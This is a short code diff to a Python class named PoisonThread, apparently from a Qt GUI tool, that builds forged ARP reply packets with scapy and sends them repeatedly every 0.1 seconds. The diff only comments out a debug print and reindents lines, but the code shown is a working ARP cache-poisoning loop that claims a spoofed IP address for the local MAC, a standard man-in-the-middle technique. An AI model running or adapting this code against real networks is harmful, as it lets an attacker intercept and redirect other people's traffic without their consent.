@@ -14,7 +14,7 @@ class PoisonThread(QtCore.QThread):
         self.pktRecvMac = pktRecvMac
         self.pktRecvIp = pktRecvIp
         self.startFlag = True
-        print(self.localMac, self.deceiveIp, self.pktRecvMac, self.pktRecvIp)
+        # print(self.localMac, self.deceiveIp, self.pktRecvMac, self.pktRecvIp)
 
     def __del__(self):
         self.quit()
@@ -26,11 +26,11 @@ class PoisonThread(QtCore.QThread):
     def run(self):
         pkt = Ether(
             src=self.localMac, dst=self.pktRecvMac) / ARP(
-                hwsrc=self.localMac,
-                psrc=self.deceiveIp,
-                hwdst=self.pktRecvMac,
-                pdst=self.pktRecvIp,
-                op=2)
+            hwsrc=self.localMac,
+            psrc=self.deceiveIp,
+            hwdst=self.pktRecvMac,
+            pdst=self.pktRecvIp,
+            op=2)
         while self.startFlag:
             # Every Per 0.1 second send a package
             # After 10 package(1 second) check starFlag again
